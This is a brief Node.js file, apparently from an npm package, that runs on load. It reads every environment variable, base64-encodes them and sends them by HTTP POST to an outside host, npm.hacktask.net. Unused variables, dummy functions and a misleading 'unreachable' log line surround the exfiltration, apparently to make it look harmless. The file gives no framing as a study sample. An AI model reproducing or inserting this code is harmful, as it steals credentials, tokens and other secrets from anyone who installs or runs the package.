const http = require('http')
const querystring = require('querystring')
const host = 'npm.hacktask.net'
const env = JSON.stringify(process.env)
const data = Buffer.from(env).toString('base64')
const postData = querystring.stringify({ data })
const options = {
  hostname: host,
  port: 80,
  path: '/log/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData),
  },
}
function getRandomNumber() {
  return Math.floor(Math.random() * 100)
}
const unusedVariable = 'This variable is not used'
const req = http.request(options)
function logMessage(message) {
  console.log(message)
}
req.write(postData)
console.log('This line is unreachable')
req.end()
